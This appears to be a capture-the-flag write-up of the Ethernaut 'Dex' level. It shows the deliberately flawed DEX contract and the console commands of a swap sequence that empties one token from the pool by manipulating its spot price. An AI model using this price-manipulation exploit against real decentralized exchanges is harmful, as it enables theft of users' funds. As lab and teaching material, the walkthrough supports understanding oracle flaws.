
<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg">


# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

Challemge's message:

> The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation. You will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token. You will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a "bad" price of the assets.

# Subverting


```js
var token1 = await contract.token1()
```

```js
var token2 = await contract.token2()
```

```js
await contract.balanceOf(token1,player)
i {negative: 0, words: Array(2), length: 1, red: null}
length
: 
1
negative
: 
0
red
: 
null
words
: 
(2) [10, empty]
[[Prototype]]
: 
Object
```

```js
await contract.balanceOf(token2,player)
i {negative: 0, words: Array(2), length: 1, red: null}
length
: 
1
negative
: 
0
red
: 
null
words
: 
(2) [10, empty]
[[Prototype]]
: 
Object
```

```js
await contract.swap(token1, token2, 10)
await contract.swap(token2, token1, 20)
await contract.swap(token1, token2, 24)
await contract.swap(token2, token1, 30)
await contract.swap(token1, token2, 41)
await contract.swap(token2, token1, 45)
```

```js
await contract.balanceOf(token1, instance).then(v => v.toString())

'0'
```

Ethernaut's message:

> The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts. You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.
The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. However, if we were to consider tokens that represent actual assets rather than fictitious ones, most of them would have exchange pairs in several dexes and networks. This would decrease the effect on the asset's price in case a specific dex is targeted by an attack like this.
